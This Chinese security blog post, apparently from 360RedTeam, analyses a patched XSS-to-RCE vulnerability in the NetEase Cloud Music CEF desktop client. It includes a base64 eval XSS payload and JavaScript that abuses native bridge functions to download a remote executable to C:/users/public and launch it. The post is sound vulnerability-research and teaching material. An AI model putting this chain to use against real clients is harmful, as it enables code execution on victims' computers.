> 原文链接: https://www.anquanke.com//post/id/197219 


# 嵌入式浏览器安全之网易云音乐RCE漏洞分析


                                阅读量   
                                **1181707**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t01ff4916c6966f8e99.jpg)](https://p1.ssl.qhimg.com/t01ff4916c6966f8e99.jpg)



Author: Wfox@360RedTeam

## 0x00 前言

前面章节讲解了应用程序是如何与网页进行交互的，接下来章节分析通用软件历史漏洞，通过真实漏洞案例分析去了解嵌入式浏览器安全的攻击面。本章节讲的是网易云音乐rce漏洞分析，一个经典的XSS to RCE漏洞。

往期文章回顾： [1. 《嵌入式浏览器安全之初识Cef》](https://www.anquanke.com/post/id/194854)



## 0x01 Cef资源文件加载

cef浏览器中加载web网页访问通常分为两种，分别是远程资源加载、本地资源加载。

远程资源加载，通过http、https等协议加载网页，通常在软件里作为扩展功能，可延展性强，缺点是页面加载速度受网络环境影响。 本地资源加载，通过file协议实现加载web页面，也是cef桌面应用的主要实现方式。本地加载uri实现方式分为三种：
1. 绝对文件路径加载 file:///c:/application/index.html
<li>伪host加载 [file://application/index.html](file://application/index.html)
</li>
<li>伪协议&amp;伪host加载 [custom://application/index.html](custom://application/index.html)
</li>
第2、3种方式是通过cef资源重定向实现的，在使用cef加载本地web资源时，html或者js文件很可能会暴露一些接口或者重要数据，为了代码保护需要把web资源进行加密，常见方式是通过zip进行密码加密。解密也比较简单，逆向主程序文件找到解压密码或者zip明文攻击就能解压加密的资源文件。

具体的实现原理这里不再复述，感兴趣的可以阅读这篇文章 <a spellcheck="false">https://blog.csdn.net/csdnyonghu123/article/details/92808278</a>

漏洞挖掘的第一步，先打开网易云音乐的目录，可以看到明显的Cef目录架构，比如说子目录、依赖库特征等。

[![](https://p2.ssl.qhimg.com/t0152c1212149eac328.jpg)](https://p2.ssl.qhimg.com/t0152c1212149eac328.jpg)

在package目录中，找到了网易云音乐的资源文件包orpheus.ntpk，以zip格式解压得到网易云音乐html资源文件。

[![](https://p1.ssl.qhimg.com/t01729386d12a7516cc.jpg)](https://p1.ssl.qhimg.com/t01729386d12a7516cc.jpg)

解压之后目录结构如下，包含了html、js、css文件等，正是这些构成了网易云音乐的整个前端界面。

[![](https://p0.ssl.qhimg.com/t0100cfe0686477c0e0.jpg)](https://p0.ssl.qhimg.com/t0100cfe0686477c0e0.jpg)

当网易云音乐主程序打开时就会加载链接 [orpheus://orpheus/pub/app.html](orpheus://orpheus/pub/app.html)，经过cef资源重定向处理后，加载orpheus.ntpk压缩包的/pub/app.html，也就是我们最为熟悉的主界面。

[![](https://p0.ssl.qhimg.com/t01b5d50deced320341.jpg)](https://p0.ssl.qhimg.com/t01b5d50deced320341.jpg)

通过进程查看软件Process Hacker查看cloudmusic.exe进程，可以看到cloudmusic.exe主进程下面起了两个子进程。

[![](https://p1.ssl.qhimg.com/t0195418bcd09df66a5.jpg)](https://p1.ssl.qhimg.com/t0195418bcd09df66a5.jpg)

这两个进程分别是render进程与GPU加速进程，GPU加速进程用于加速页面渲染，在网易云音乐的设置里可以禁用GPU加速。

```
// cef render进程
"D:\software\Netease\CloudMusic\cloudmusic.exe" --type=renderer --high-dpi-support=1 --lang=en-US --lang=en-US --log-file="C:\Users\pc\AppData\Local\Netease\CloudMusic\web.log" --product-version="Chrome/35.0.1916.157 NeteaseMusicDesktop/2.7.0.198230" --context-safety-implementation=-1 --uncaught-exception-stack-size=1048576 --no-sandbox --enable-pinch --enable-threaded-compositing --enable-delegated-renderer --enable-software-compositing --channel="5180.1.1167745776\650049420" /prefetch:673131151
​
// cef gpu加速渲染进程
"D:\software\Netease\CloudMusic\cloudmusic.exe" --type=gpu-process --channel="5180.0.520330526\2071578727" --high-dpi-support=1 --lang=en-US --log-file="C:\Users\pc\AppData\Local\Netease\CloudMusic\web.log" --product-version="Chrome/35.0.1916.157 NeteaseMusicDesktop/2.7.0.198230" --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=1,15 --gpu-vendor-id=0x15ad --gpu-device-id=0x0405 --gpu-driver-vendor="VMware, Inc." --gpu-driver-version=8.16.1.24 --lang=en-US --log-file="C:\Users\pc\AppData\Local\Netease\CloudMusic\web.log" --product-version="Chrome/35.0.1916.157 NeteaseMusicDesktop/2.7.0.198230" --no-sandbox /prefetch:822062411
```

在漏洞挖掘过程中可以关注下cef进程的启动参数，指不定有些好玩的启动参数，后边章节再讲这方面。



## 0x02 寻找突破点

在拿到源码文件之后，能做的事情很多，感兴趣的可以自行从html、js里边发掘。这次的目的是为了给客户端弹个计算器，所以首先要达到一个目标，执行任意JavaScript，先从一个xss漏洞开始。

接下来就是常规的Web前端漏洞挖掘思路，在发掘过程中可以将html、js进行格式化，方便阅读代码。

原漏洞作者的思路是从html模板文件找到未过滤的模板变量，从而控制输出点达到xss。但在实际挖掘中，大部分html输出点都是不可控的，原作者找到的xss触发点在电台页面/pub/module/main/djradio/show/index.html的电台名称字段。

[![](https://p5.ssl.qhimg.com/t0133b68aff7312b05d.jpg)](https://p5.ssl.qhimg.com/t0133b68aff7312b05d.jpg)

漏洞点修复前是$`{`x.name`}`，修复之后加上了escape进行编码过滤。

我们需要添加一个名称带有xss payload的电台，受害者通过搜索电台名称，在访问电台页时即可触发xss。

原漏洞作者提到了通过外置浏览器跳转到伪协议链接[orpheus://native/start.html?action=migrate&amp;src=D%3A%5CCloudMUsic&amp;dest=D%3A%5CTest](orpheus://native/start.html?action=migrate&amp;src=D%3A%5CCloudMUsic&amp;dest=D%3A%5CTest)，从而唤起网易云音乐，但经过实际分析测试，只能唤起应用但不能跳到对应搜索页面。

那外置浏览器是如何调用网易云音乐伪协议，通过注册表可以查看windows系统中注册的所有伪协议，比如网易云音乐orpheus协议在注册表的地址为 HKEY_CLASSES_ROOT\orpheus\shell\open\command，键值为 “D:\software\Netease\CloudMusic\cloudmusic.exe” –webcmd=”%1″，%1作为变量对应的是完整的伪协议url，最终创建进程 D:\software\Netease\CloudMusic\cloudmusic.exe” –webcmd=”[orpheus://native/start.html?action=migrate&amp;src=D%3A%5CCloudMUsic&amp;dest=D%3A%5CTest](orpheus://native/start.html?action=migrate&amp;src=D%3A%5CCloudMUsic&amp;dest=D%3A%5CTest)”

目前电台页面处无法复现漏洞，所以搬了原作者的xss效果图。

[![](https://p3.ssl.qhimg.com/t01649ab6a2176368be.jpg)](https://p3.ssl.qhimg.com/t01649ab6a2176368be.jpg)



## 0x03 进阶攻击

小目标达到了，接下来就是如何将xss漏洞的危害扩大，这里就要用到第一节讲到的知识点，应用程序会在render进程上下文中注册许多JavaScript扩展函数，用于应用程序与网页进行交互。

举个例子，缓存歌曲、缓存突破、下载歌曲、下载歌词文件这些功能都需要涉及文件操作，但网页由于安全策略限制是无法直接保存文件的，所以需要通过JavaScript调用native function来实现文件操作。

当然应用程序注册的JavaScript扩展函数不止这些，接下来进阶攻击就是寻找脆弱的JS扩展函数进行复用，以达到窃取数据、劫持登录凭证、读取任意文件、甚至控制对方计算机权限的目的。

现在复测没有xss漏洞可以用，那我们就假装有一个xss，通过拦截网易云音乐的请求修改响应，插入我们的JavaScript代码。此时祭出大杀器BurpSuite，通过网易云音乐自带的HTTP代理功能设置成127.0.0.1:8080

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013cbbd456c576a0a9.jpg)

代理设置成功后，BurpSuite就能抓到网易云音乐的请求。这里用漏洞版本2.1.2.180086作为演示，前面提到过网易云音乐有很多html输出点都没过滤的，但是内容是不可控的。在旧版本网易云音乐中，可以通过BurpSuite拦截修改api请求的明文响应包插入xss payload，触发XSS。（新版本中api请求响应都加密了）

比如说在搜索歌词时，响应部分的lyrics字段会作为html内容插入到页面中，可以替换这部分的响应内容插入xss内容。

[![](https://p2.ssl.qhimg.com/t01e395c06d4820aa09.jpg)](https://p2.ssl.qhimg.com/t01e395c06d4820aa09.jpg)

添加自动替换响应包规则，省得每次都要拦截修改响应。

[![](https://p5.ssl.qhimg.com/t01ec5c57e69fe51860.jpg)](https://p5.ssl.qhimg.com/t01ec5c57e69fe51860.jpg)

随便搜一个查询条数少的关键词，切到歌词的搜索结果，加载替换响应内容后成功触发XSS。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cfe04ab521ada286.jpg)

通常cef程序很少会留有可以直接系统命令的扩展函数，所以常见的rce思路是下载可执行文件+运行文件以达到rce的效果。接下来就是通读代码，寻找任意保存文件的扩展函数。

网易云音乐的主要功能逻辑在core.js文件，第一步先将混淆的JavaScript代码美化，提高代码可读性，在代码量居多的情况下可以搜索相关关键词以定位函数，如save、保存、download、下载等，通过关键词定位找到一处可疑的功能代码。

[![](https://p3.ssl.qhimg.com/t0108e8d4974fea363e.jpg)](https://p3.ssl.qhimg.com/t0108e8d4974fea363e.jpg)

根据代码上下文逻辑，构造出文件下载保存的JavaScript代码。

```
var byz = NEJ.P;
bD = byz("nej.cef");
bD.cFB("download.start", `{` id: "image_download", url: "https://www.baidu.com/img/bd_logo1.png", rel_path: "C:/users/public/1.png", pre_path: "", type: 1 `}`);
```

JavaScript代码太长在xss里格式不好处理，所以将xss代码base64执行。

```
&lt;img src=x onerror=eval(atob('dmFyIGJ5eiA9IE5FSi5QOwpiRCA9IGJ5eigibmVqLmNlZiIpOwpiRC5jRkIoImRvd25sb2FkLnN0YXJ0IiwgeyBpZDogImltYWdlX2Rvd25sb2FkIiwgdXJsOiAiaHR0cHM6Ly93d3cuYmFpZHUuY29tL2ltZy9iZF9sb2dvMS5wbmciLCByZWxfcGF0aDogIkM6L3VzZXJzL3B1YmxpYy8xLnBuZyIsIHByZV9wYXRoOiAiIiwgdHlwZTogMSB9KTs='))&gt;
```

插入XSS代码触发，可以将任意远程文件保存到本地任意位置。poc触发成功后将百度logo图片保存到c:/users/public/1.png

[![](https://p3.ssl.qhimg.com/t01229093e754ef9b6f.jpg)](https://p3.ssl.qhimg.com/t01229093e754ef9b6f.jpg)

当然在实际场景中可能会遇到长度限制，这里只是把payload写在一起作为演示，正常利用建议还是引用远程JS文件。

exe文件已经落地到文件系统中了，接下来就是如何触发下载后的exe文件。通读代码可以发现，网易云音乐基本是通过bD.cFB、bD.bX调用native函数，可以围绕着这些函数调用进行发掘，然后复用函数方法。

通过技巧找到了打开exe文件的方法，这个函数原意应该是用来打开文件夹的，文件/pub/module/main/offline/complete/index.html

[![](https://p3.ssl.qhimg.com/t01d0be3ee6e4ef2abf.jpg)](https://p3.ssl.qhimg.com/t01d0be3ee6e4ef2abf.jpg)

根据代码上下文逻辑，构造出打开指定exe文件的JavaScript代码。

```
var byz = NEJ.P;
bD = byz("nej.cef");
bD.bX("os.shellOpen", "c:/windows/system32/calc.exe");
```

[![](https://p2.ssl.qhimg.com/t010d934bf242fb1897.jpg)](https://p2.ssl.qhimg.com/t010d934bf242fb1897.jpg)

文件下载、打开exe文件都具备了，接下来构造完整漏洞利用代码。

```
var byz = NEJ.P;
bD = byz("nej.cef");
bD.cFB("download.start", `{` id: "image_download", url: "https://xxx.com/calc.jpg", rel_path: "c:/users/public/1.exe", pre_path: "", type: 1 `}`);
setTimeout(function()`{`bD.bX("os.shellOpen", "c:/users/public/1.exe")`}`, 5000);
```

[![](https://p0.ssl.qhimg.com/t0152a226c7e265a839.jpg)](https://p0.ssl.qhimg.com/t0152a226c7e265a839.jpg)

完整利用流程：插入xss payload -&gt; 诱导别人触发xss -&gt; 下载保存exe文件 -&gt; 打开执行exe文件

在网易云音乐最新版本中不仅修复了xss漏洞、增加CSP安全策略，还修复了文件下载、打开文件等涉及文件操作的许多函数，使攻击成本加大，熟悉逆向的可以分析下判断逻辑是否能够绕过。



## 0x04 结语

本章节涉及了cef资源加载、目录结构分析、进程启动分析、scheme协议注册、XSS漏洞挖掘、native交互漏洞挖掘等知识点，完成一个XSS to RCE漏洞的挖掘才能算是真正的入门。当Web安全人员去真正发掘这方面漏洞时，会发现嵌入式浏览器漏洞挖掘也没那么难以触及，主要是通读代码跟复现代码逻辑会比较耗时间，感兴趣的朋友可以尝试下挖掘通用点的桌面应用~



## 0x05 参考

漏洞原作者：evi1m0 [https://www.chinabaiker.com/thread-2897-1-1.html](https://www.chinabaiker.com/thread-2897-1-1.html) [https://blog.csdn.net/csdnyonghu123/article/details/92808278](https://blog.csdn.net/csdnyonghu123/article/details/92808278)
